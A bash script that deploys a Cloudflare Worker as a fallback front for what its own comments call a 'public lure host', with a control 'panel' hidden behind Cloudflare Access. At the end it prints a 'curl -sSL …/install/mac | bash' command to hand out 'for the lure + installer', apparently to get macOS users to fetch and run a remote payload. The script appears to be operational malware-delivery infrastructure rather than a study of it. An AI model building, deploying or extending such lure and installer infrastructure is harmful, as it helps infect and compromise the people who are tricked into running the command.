#!/usr/bin/env bash
# Deploy the fleet edge fallback Worker to Cloudflare.
#
# usage:
#   sudo ./deploy/worker-deploy.sh                 # reads /etc/panel/env
#   CF_API_TOKEN=... CF_ZONE_NAME=telcom.stream ./deploy/worker-deploy.sh
#
# Optional:
#   WORKER_NAME=fleet-edge        script name (default fleet-edge)
#   ORIGIN=https://panel.example  upstream origin (default panel.<zone>)
#   WORKER_ROUTE=edge.example/*   attach a custom route (zone must exist)
#
# Prints the resulting https://<name>.<account>.workers.dev URL on success.
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ENV_FILE="${ENV_FILE:-/etc/panel/env}"
if [ -f "$ENV_FILE" ]; then
  set -a
  # shellcheck disable=SC1090
  . "$ENV_FILE"
  set +a
fi

: "${CF_API_TOKEN:?CF_API_TOKEN is required}"
: "${CF_ZONE_NAME:?CF_ZONE_NAME is required}"

WORKER_NAME="${WORKER_NAME:-fleet-edge}"
# Public lure host, not panel.<zone>: panel is behind Cloudflare Access and
# would answer the Worker with a 302 to the Access login.
ORIGIN="${ORIGIN:-https://${PANEL_LURE_HOST:-get}.$CF_ZONE_NAME}"
API="https://api.cloudflare.com/client/v4"
SRC="$REPO_DIR/deploy/worker/worker.js"
[ -f "$SRC" ] || { echo "missing $SRC" >&2; exit 1; }

log() { printf '[worker] %s\n' "$*"; }
die() { printf '[worker] ERROR: %s\n' "$*" >&2; exit 1; }

api_get() { curl -fsS -H "Authorization: Bearer $CF_API_TOKEN" "$@"; }

log "resolving zone $CF_ZONE_NAME"
zone_json="$(api_get "$API/zones?name=$CF_ZONE_NAME")" || die "zone lookup failed"
account_id="$(printf '%s' "$zone_json" | python3 -c '
import json, sys
data = json.load(sys.stdin)
if not data.get("success"):
    sys.exit("cloudflare: " + json.dumps(data.get("errors")))
print(data["result"][0]["account"]["id"])
')" || die "could not resolve account id"
zone_id="$(printf '%s' "$zone_json" | python3 -c '
import json, sys
print(json.load(sys.stdin)["result"][0]["id"])
')"
log "account $account_id zone $zone_id origin $ORIGIN"

metadata="$(python3 - "$ORIGIN" <<'PY'
import json, sys
print(json.dumps({
    "main_module": "worker.js",
    "compatibility_date": "2025-01-01",
    "bindings": [{"type": "plain_text", "name": "ORIGIN", "text": sys.argv[1]}],
}))
PY
)"

log "uploading worker $WORKER_NAME"
curl -fsS -X PUT \
  -H "Authorization: Bearer $CF_API_TOKEN" \
  -F "metadata=$metadata;type=application/json" \
  -F "worker.js=@$SRC;type=application/javascript+module" \
  "$API/accounts/$account_id/workers/scripts/$WORKER_NAME" >/dev/null \
  || die "worker upload failed"

log "enabling workers.dev subdomain"
curl -fsS -X POST \
  -H "Authorization: Bearer $CF_API_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"enabled":true}' \
  "$API/accounts/$account_id/workers/scripts/$WORKER_NAME/subdomain" >/dev/null \
  || die "could not enable workers.dev subdomain"

subdomain="$(api_get "$API/accounts/$account_id/workers/subdomain" | python3 -c '
import json, sys
print(json.load(sys.stdin)["result"]["subdomain"])
')" || subdomain=""

if [ -n "${WORKER_ROUTE:-}" ]; then
  log "attaching route $WORKER_ROUTE"
  curl -fsS -X POST \
    -H "Authorization: Bearer $CF_API_TOKEN" \
    -H "Content-Type: application/json" \
    --data "{\"pattern\":\"$WORKER_ROUTE\",\"script\":\"$WORKER_NAME\"}" \
    "$API/zones/$zone_id/workers/routes" >/dev/null \
    || log "warning: route attach failed (create the DNS record first)"
fi

if [ -n "$subdomain" ]; then
  printf '\nFallback URL: https://%s.%s.workers.dev\n' "$WORKER_NAME" "$subdomain"
  printf 'Use it for the lure + installer:\n'
  printf '  curl -sSL https://%s.%s.workers.dev/install/mac | bash\n\n' \
    "$WORKER_NAME" "$subdomain"
else
  log "worker deployed; workers.dev subdomain unavailable (custom route only)"
fi
